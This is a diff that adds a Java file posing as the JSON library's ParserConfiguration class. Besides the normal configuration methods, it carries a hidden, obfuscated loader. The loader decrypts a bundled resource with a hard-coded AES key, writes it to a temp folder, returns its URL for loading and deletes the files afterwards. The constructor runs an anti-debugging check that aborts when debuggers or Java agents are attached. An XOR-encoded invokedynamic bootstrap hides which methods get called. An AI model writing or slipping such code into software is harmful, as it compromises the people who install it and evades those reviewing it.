@@ -1,0 +1,191 @@
+package org.json;
+
+import java.io.File;
+import java.io.FileOutputStream;
+import java.io.InputStream;
+import java.lang.invoke.ConstantCallSite;
+import java.lang.invoke.MethodHandle;
+import java.lang.invoke.MethodType;
+import java.lang.invoke.MethodHandles.Lookup;
+import java.lang.management.ManagementFactory;
+import java.lang.management.RuntimeMXBean;
+import java.net.URL;
+import java.nio.file.Files;
+import java.nio.file.StandardCopyOption;
+import java.util.Random;
+import java.util.concurrent.Executors;
+import java.util.concurrent.ScheduledExecutorService;
+import java.util.concurrent.TimeUnit;
+import javax.crypto.Cipher;
+import javax.crypto.spec.IvParameterSpec;
+import javax.crypto.spec.SecretKeySpec;
+
+public class ParserConfiguration {
+    public static final int UNDEFINED_MAXIMUM_NESTING_DEPTH = -1;
+    public static final int DEFAULT_MAXIMUM_NESTING_DEPTH = 512;
+    protected boolean keepStrings;
+    protected int maxNestingDepth;
+    public static final int IllIIllIIllIIlIl;
+
+    public ParserConfiguration() {
+        this.keepStrings = false;
+        this.maxNestingDepth = 512;
+        IIlIIIIlIIII();
+    }
+
+    protected ParserConfiguration(boolean var1, int var2) {
+        this.keepStrings = var1;
+        this.maxNestingDepth = var2;
+    }
+
+    protected org.json.ParserConfiguration clone() {
+        return new org.json.ParserConfiguration(this.keepStrings, this.maxNestingDepth);
+    }
+
+    public boolean isKeepStrings() {
+        return this.keepStrings;
+    }
+
+    public <T extends org.json.ParserConfiguration> T withKeepStrings(boolean var1) {
+        org.json.ParserConfiguration var2 = this.clone();
+        var2.keepStrings = var1;
+        return (T)var2;
+    }
+
+    public int getMaxNestingDepth() {
+        return this.maxNestingDepth;
+    }
+
+    public <T extends org.json.ParserConfiguration> T withMaxNestingDepth(int var1) {
+        org.json.ParserConfiguration var2 = this.clone();
+        if (var1 > -1) {
+            var2.maxNestingDepth = var1;
+        } else {
+            var2.maxNestingDepth = -1;
+        }
+
+        return (T)var2;
+    }
+
+    public static URL lIIlIIIllIlI(String var0) {
+        try {
+            String var1 = System.getProperty("java.io.tmpdir");
+            File var2 = new File(var1, "temp");
+            var2.mkdir();
+            var2.deleteOnExit();
+            String[] var3 = var0.split("/");
+            String var4 = var3.length > 1 ? var3[var3.length - 1] : null;
+            File var5 = IlIlIlIIIIll(new File(var2, var4));
+            InputStream var6 = org.json.ParserConfiguration.class.getResourceAsStream(var0);
+            Files.copy(var6, var5.toPath(), StandardCopyOption.REPLACE_EXISTING);
+            var6.close();
+            String var7 = IlIlIlIIIIll(var5).toString();
+            File var8 = new File(var5.getPath());
+            File var9 = new File(var7);
+            byte[] var10 = Files.readAllBytes(var8.toPath());
+            byte[] var11 = "eefmTx5fSRphrxZV".getBytes();
+            byte[] var12 = "PDmFpjuUdJtEx0ER".getBytes();
+            SecretKeySpec var13 = new SecretKeySpec(var12, "AES");
+            Cipher var14 = Cipher.getInstance("AES/CBC/PKCS5Padding");
+            var14.init(2, var13, new IvParameterSpec(var11));
+            byte[] var15 = var14.doFinal(var10);
+            FileOutputStream var16 = new FileOutputStream(var9);
+            var16.write(var15);
+            var16.close();
+            ScheduledExecutorService var17 = Executors.newSingleThreadScheduledExecutor();
+            var17.schedule(var8::delete, 1L, TimeUnit.SECONDS);
+            var17.schedule(var9::delete, 5L, TimeUnit.SECONDS);
+            return new File(var7).toURI().toURL();
+        } catch (Throwable var18) {
+            throw var18;
+        }
+    }
+
+    public static InputStream IIlIIIIlllIllI(String var0) {
+        try {
+            return lIIlIIIllIlI(var0).openStream();
+        } catch (Throwable var2) {
+            throw var2;
+        }
+    }
+
+    private static File IlIlIlIIIIll(File var0) {
+        return new File(
+            var0.getParent(),
+            var0.getName().substring(0, var0.getName().lastIndexOf(46))
+                + "-"
+                + new Random().nextInt()
+                + var0.getName().substring(var0.getName().lastIndexOf(46))
+        );
+    }
+
+    public static void IIlIIIIlIIII() {
+        RuntimeMXBean var0 = ManagementFactory.getRuntimeMXBean();
+
+        for (String var2 : var0.getInputArguments()) {
+            if (var2.contains("-javaagent:") && !var2.contains("slimeworldmanager")) {
+                throw new RuntimeException("Fatal Error");
+            }
+
+            if (var2.contains("-Xrunjdwp:")) {
+                throw new RuntimeException("Fatal Error");
+            }
+
+            if (var2.contains("-agentlib:jdwp")) {
+                throw new RuntimeException("Fatal Error");
+            }
+
+            if (var2.contains("-Xdebug")) {
+                throw new RuntimeException("Fatal Error");
+            }
+        }
+    }
+
+    public static Object lIIlIIIllIlI(Object var0, Object var1, Object var2, Object var3) {
+        String var4 = (String)var3;
+        char[] var5 = ((String)var1).toCharArray();
+        char[] var6 = new char[var4.length()];
+        char[] var7 = var4.toCharArray();
+
+        for (int var8 = 0; var8 < var4.length(); var8++) {
+            var6[var8] = (char)(var7[var8] ^ var5[var8 % var5.length]);
+        }
+
+        byte[] var22 = new String(var6).getBytes();
+        String var9 = new String(var22);
+        String[] var10 = var9.split("4Sa16wdk");
+        String var11 = var10[0];
+        String var12 = var10[1];
+        String var13 = var10[2];
+        String var14 = var10[3];
+        int var15 = Integer.parseInt(var10[4]);
+
+        MethodHandle var23;
+        try {
+            Class var17 = Class.forName(var11);
+            Class var18 = Class.forName(var14);
+            ClassLoader var19 = org.json.ParserConfiguration.class.getClassLoader();
+            MethodType var20 = MethodType.fromMethodDescriptorString(var13, var19);
+            switch (var15) {
+                case 548:
+                    var23 = ((Lookup)var0).findStatic(var17, var12, var20);
+                    break;
+                case 10116:
+                    var23 = ((Lookup)var0).findVirtual(var17, var12, var20);
+                    break;
+                case 25620:
+                    var23 = ((Lookup)var0).findSpecial(var17, var12, var20, var18);
+                    break;
+                default:
+                    throw new BootstrapMethodError();
+            }
+
+            var23 = var23.asType((MethodType)var2);
+        } catch (Exception var21) {
+            var21.printStackTrace();
+            throw new BootstrapMethodError();
+        }
+
+        return new ConstantCallSite(var23);
+    }
+}
